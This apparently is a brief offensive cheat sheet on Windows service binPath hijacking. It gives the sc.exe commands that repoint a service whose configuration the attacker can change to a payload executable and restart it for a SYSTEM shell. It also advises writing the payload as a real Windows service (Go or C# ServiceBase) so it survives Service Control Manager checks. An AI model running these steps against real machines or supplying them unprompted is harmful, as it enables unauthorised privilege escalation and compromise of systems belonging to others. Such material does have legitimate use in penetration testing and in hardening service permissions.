# Service binPath Hijack (sc.exe)

If your account (directly, or via a custom group like "Print Services Operators") holds `WRITE_DAC`/configure rights over a service, repoint its binary and (re)start it for a SYSTEM shell:

```cmd
sc.exe stop <ServiceName>
sc.exe config <ServiceName> binPath= "C:\path\to\payload.exe"
sc.exe qc <ServiceName>
sc.exe start <ServiceName>
```
A plain shellcode-runner payload usually dies immediately — the SCM expects it to behave like a real service (respond to Stop/Shutdown control requests). Write it as an actual Windows service (e.g. Go's `golang.org/x/sys/windows/svc`, or C# `ServiceBase`) that starts the payload in a goroutine/thread *before* calling `svc.Run`/`Run()`, so it keeps acknowledging SCM control codes while your payload executes.
